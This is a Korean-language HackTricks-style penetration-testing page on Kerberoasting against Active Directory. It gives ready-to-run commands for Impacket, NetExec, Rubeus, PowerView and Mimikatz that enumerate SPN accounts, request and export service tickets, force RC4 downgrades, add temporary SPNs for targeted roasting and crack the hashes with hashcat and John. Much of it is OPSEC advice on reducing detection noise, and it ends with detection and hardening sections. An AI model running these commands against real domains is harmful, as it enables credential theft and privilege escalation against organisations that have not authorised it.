# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting는 TGS 티켓, 특히 컴퓨터 계정이 아닌 Active Directory (AD)의 사용자 계정으로 실행되는 서비스와 관련된 티켓을 획득하는 데 중점을 둡니다. 이러한 티켓의 암호화에는 사용자 비밀번호에서 파생된 키가 사용되므로, 오프라인 credential cracking이 가능합니다. 사용자가 서비스 계정으로 사용되고 있음을 나타내는 지표는 비어 있지 않은 ServicePrincipalName (SPN) 속성입니다.

인증된 모든 domain user는 TGS 티켓을 요청할 수 있으므로 특별한 권한이 필요하지 않습니다.<sup>[[4]](#references)[[5]](#references)</sup>

### 주요 사항

- 사용자 계정으로 실행되는 서비스(SPN이 설정된 계정, 컴퓨터 계정 제외)의 TGS 티켓을 대상으로 합니다.
- 티켓은 서비스 계정의 비밀번호에서 파생된 키로 암호화되며 오프라인에서 crack할 수 있습니다.
- elevated privileges가 필요하지 않으며, 인증된 모든 계정이 TGS 티켓을 요청할 수 있습니다.

> [!WARNING]
> 대부분의 public tools는 AES보다 crack이 빠르기 때문에 RC4-HMAC (etype 23) service tickets 요청을 선호합니다. RC4 TGS hashes는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 그러나 많은 환경이 AES-only로 전환하고 있습니다. RC4만 관련 있다고 가정하지 마세요.
> 또한 “spray-and-pray” roasting은 피하세요. Rubeus의 기본 kerberoast는 모든 SPN을 조회하고 티켓을 요청할 수 있어 탐지 흔적이 큽니다. 먼저 interesting principals를 열거하고 대상으로 지정하세요.

### Service account secrets & Kerberos crypto cost

많은 서비스가 여전히 수동으로 관리되는 비밀번호를 사용하는 사용자 계정으로 실행됩니다. KDC는 이러한 비밀번호에서 파생된 키로 service tickets를 암호화하고, 인증된 모든 principal에게 ciphertext를 전달합니다. 따라서 kerberoasting은 account lockout이나 DC telemetry 없이 무제한 오프라인 추측을 가능하게 합니다. 암호화 모드에 따라 cracking budget이 결정됩니다.

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt가 rainbow tables를 차단하지만 짧은 비밀번호는 여전히 빠르게 crack할 수 있습니다. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES보다 약 1000배 빠르며, `msDS-SupportedEncryptionTypes`가 허용하는 경우 공격자는 항상 RC4를 강제합니다. |

*Matthew Green's Kerberoasting analysis의 [Chick3nman 벤치마크](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)입니다.<sup>[[3]](#references)</sup>

RC4의 confounder는 keystream만 무작위화하며, 각 추측에 필요한 작업량을 증가시키지 않습니다. 서비스 계정이 random secrets(gMSA/dMSA, machine accounts 또는 vault-managed strings)에 의존하지 않는 한, compromise 속도는 순전히 GPU budget에 의해 결정됩니다. AES-only etypes를 적용하면 초당 수십억 번의 추측이 가능한 downgrade를 제거할 수 있지만, 취약한 human passwords는 여전히 PBKDF2에 의해 crack됩니다.<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec을 사용해 roastable tickets를 요청하고 Hashcat으로 crack하는 실용적인 end-to-end 예제는 reference [1]에서 확인할 수 있습니다.<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast 점검을 포함한 다기능 도구:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable users 열거
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 기법 1: TGS 요청 및 메모리에서 dump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 기법 2: 자동화 도구
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 요청은 Windows Security Event 4769 (Kerberos service ticket이 요청됨)을 생성합니다.

### OPSEC 및 AES-only 환경

- AES가 없는 계정에 의도적으로 RC4 요청:
- Rubeus: `/rc4opsec`은 tgtdeleg를 사용하여 AES가 없는 계정을 열거하고 RC4 service ticket을 요청합니다.
- Rubeus: kerberoast와 함께 `/tgtdeleg`를 사용하면 가능한 경우 RC4 요청도 발생합니다.<sup>[[6]](#references)</sup>
- 조용히 실패하는 대신 AES-only 계정을 Roast:
- Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES service ticket(etype 17/18)을 요청합니다.
- 이미 TGT(PTT 또는 .kirbi에서)를 보유한 경우 `/spn:<SPN>` 또는 `/spns:<file>`과 함께 `/ticket:<blob|path>`를 사용하여 LDAP를 건너뛸 수 있습니다.
- 타겟 지정, throttling 및 noise 감소:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` 및 `/jitter:<1-100>`을 사용합니다.
- `/pwdsetbefore:<MM-dd-yyyy>`(오래된 password)를 사용하여 취약할 가능성이 높은 password를 필터링하거나 `/ou:<DN>`으로 privileged OU를 대상으로 지정합니다.<sup>[[8]](#references)</sup>

예시(Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

계정을 제어하거나 수정할 수 있다면 SPN을 추가하여 해당 계정을 kerberoastable 상태로 만들 수 있습니다:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
계정을 downgrade하여 더 쉬운 cracking을 위해 RC4를 활성화합니다(대상 object에 대한 write privileges 필요):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll을 통한 Targeted Kerberoast (임시 SPN)

BloodHound에서 사용자 객체에 대한 제어 권한(예: GenericWrite/GenericAll)이 있는 것으로 표시되면, 해당 사용자에게 현재 SPN이 없더라도 특정 사용자를 안정적으로 “targeted-roast”할 수 있습니다:<sup>[[9]](#references)</sup>

- 제어 중인 사용자에게 임시 SPN을 추가하여 roastable 상태로 만듭니다.
- cracking에 유리하도록 해당 SPN에 대해 RC4(etype 23)로 암호화된 TGS-REP를 요청합니다.
- hashcat으로 `$krb5tgs$23$...` hash를 crack합니다.
- footprint를 줄이기 위해 SPN을 정리합니다.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py가 SPN 추가 -> TGS 요청(etype 23) -> SPN 제거를 자동화):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetect로 output을 crack합니다 (`$krb5tgs$23$`의 경우 mode 13100):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
탐지 참고 사항: SPN을 추가/제거하면 디렉터리 변경이 발생하며(대상 사용자에 대한 Event ID 5136/4738), TGS 요청은 Event ID 4769를 생성합니다. 요청 속도 조절과 prompt 정리를 고려하세요.

Kerberoast 공격에 유용한 도구는 여기에서 확인할 수 있습니다: https://github.com/nidem/kerberoast

Linux에서 다음 오류가 발생한다면: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` 이는 로컬 시간의 불일치 때문입니다. DC와 동기화하세요:

- `ntpdate <DC_IP>` (일부 배포판에서는 deprecated)
- `rdate -n <DC_IP>`

### 도메인 계정 없이 Kerberoast 수행하기 (AS-requested STs)

2022년 9월, Charlie Clark은 principal에 pre-authentication이 필요하지 않은 경우 요청 본문의 sname을 변경한 조작된 KRB_AS_REQ를 통해 service ticket을 얻을 수 있음을 보여주었습니다. 즉, TGT 대신 service ticket을 얻는 것입니다. 이는 AS-REP roasting과 유사하며 유효한 도메인 자격 증명이 필요하지 않습니다.

자세한 내용은 Semperis의 “New Attack Paths: AS-requested STs” write-up을 참고하세요.<sup>[[10]](#references)</sup>

> [!WARNING]
> 유효한 자격 증명이 없으면 이 technique으로 LDAP를 쿼리할 수 없으므로 사용자 목록을 제공해야 합니다.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
관련

AS-REP roastable users를 targeting하는 경우 다음도 참조하세요:

{{#ref}}
asreproast.md
{{#endref}}

### 탐지

Kerberoasting은 stealthy하게 수행될 수 있습니다. DC에서 Event ID 4769를 hunt하고 다음 필터를 적용하여 noise를 줄이세요:

- service name `krbtgt` 및 `$`로 끝나는 service name(컴퓨터 계정)을 제외합니다.
- machine account에서 발생한 requests(`*$$@*`)를 제외합니다.
- successful requests만 확인합니다(Failure Code `0x0`).
- encryption type을 추적합니다: RC4(`0x17`), AES128(`0x11`), AES256(`0x12`). `0x17`만을 기준으로 alert하지 마세요.

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
추가 아이디어:

- 호스트/사용자별 일반적인 SPN 사용량을 baseline으로 설정하고, 단일 principal에서 서로 다른 SPN 요청이 대량으로 burst되는 경우 alert를 생성합니다.
- AES로 강화된 domain에서 비정상적인 RC4 사용을 탐지합니다.

### Mitigation / Hardening

- 서비스에는 gMSA/dMSA 또는 machine account를 사용합니다. Managed account는 120자 이상의 무작위 password를 사용하고 자동으로 rotation되므로 offline cracking이 현실적으로 어렵습니다.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes`를 AES-only(10진수 24 / 16진수 0x18)로 설정하여 service account에 AES를 적용한 다음, password를 rotation하여 AES key가 파생되도록 합니다.<sup>[[7]](#references)</sup>
- 가능한 경우 environment에서 RC4를 disable하고 RC4 사용 시도를 monitor합니다. DC에서는 `msDS-SupportedEncryptionTypes`가 설정되지 않은 account의 default를 지정하기 위해 `DefaultDomainSupportedEncTypes` registry value를 사용할 수 있습니다. 충분히 테스트해야 합니다.
- user account에서 불필요한 SPN을 제거합니다.<sup>[[7]](#references)</sup>
- Managed account를 사용할 수 없는 경우 길고 무작위인 service account password(25자 이상)를 사용하고, 일반적인 password를 금지하며 정기적으로 audit합니다.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach - 실제 환경에서의 NetExec LDAP kerberoast + hashcat cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green - Kerberoasting: Legacy Kerberos Crypto를 이용한 낮은 기술 수준의 고영향 공격 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos를 attack하는 방법?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team - Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team - Kerberoasting: AES가 Enabled된 경우 RC4 Encrypted TGS 요청](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) - Kerberoasting 완화를 지원하기 위한 Microsoft의 guidance](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps - Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate - SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis - 새로운 Attack Path? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
